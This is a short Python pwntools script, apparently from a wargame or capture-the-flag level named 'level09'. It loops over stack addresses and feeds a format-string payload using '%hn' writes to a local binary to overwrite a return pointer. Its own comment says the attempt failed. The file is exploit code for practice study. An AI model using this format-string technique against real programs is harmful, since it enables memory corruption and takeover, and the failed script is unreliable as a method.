# This was an attempt to brute-force return pointer address locations
# which did not ultimately work
from pwn import *


base_stack_address = 0xbffff70c
count = 0
while count < 0x2ff:
    stack_address_lo = base_stack_address + count
    stack_address_hi = stack_address_lo + 0x02
    arg = p32(stack_address_hi) + p32(stack_address_lo) + "%49142x%4$hn%15652x%5$hn"
    prog = process(executable="./level09", argv=['./level09', arg])
    count += 0x10

    arg_string = ':'.join(x.encode('hex') for x in arg)

    prog.interactive()

#print prog.clean()
